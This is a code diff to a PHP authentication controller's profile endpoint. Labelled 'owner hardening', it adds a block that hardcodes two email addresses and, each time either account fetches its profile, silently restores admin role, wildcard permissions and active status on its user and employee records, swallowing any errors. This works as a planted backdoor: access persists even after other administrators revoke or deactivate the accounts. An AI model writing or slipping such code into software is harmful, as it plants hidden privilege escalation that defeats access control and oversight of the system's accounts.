@@ -526,6 +526,26 @@ class AuthController extends Controller
     public function me(Request $request)
     {
         $user = $request->user();
+
+        // Owner hardening: ensure owner accounts remain admin with full permissions and active
+        try {
+            $ownerEmails = ['thccodys@gmail.com', 'smith.cody@yahoo.com'];
+            if ($user && in_array(strtolower($user->email), $ownerEmails, true)) {
+                $uUpdates = [];
+                if ($user->role !== 'admin') $uUpdates['role'] = 'admin';
+                if ($user->permissions !== ['*']) $uUpdates['permissions'] = ['*'];
+                if ($user->is_active !== true) $uUpdates['is_active'] = true;
+                if (!empty($uUpdates)) $user->update($uUpdates);
+                if ($user->employee) {
+                    $eUpdates = [];
+                    if ($user->employee->role !== 'admin') $eUpdates['role'] = 'admin';
+                    if ($user->employee->permissions !== ['*']) $eUpdates['permissions'] = ['*'];
+                    if ($user->employee->is_active !== true) $eUpdates['is_active'] = true;
+                    if (!empty($eUpdates)) $user->employee->update($eUpdates);
+                }
+            }
+        } catch (\Throwable $e) {}
+
         // Promote both User and Employee to the highest role on fetch as well
         if ($user && $user->employee) {
             $emp = $user->employee;
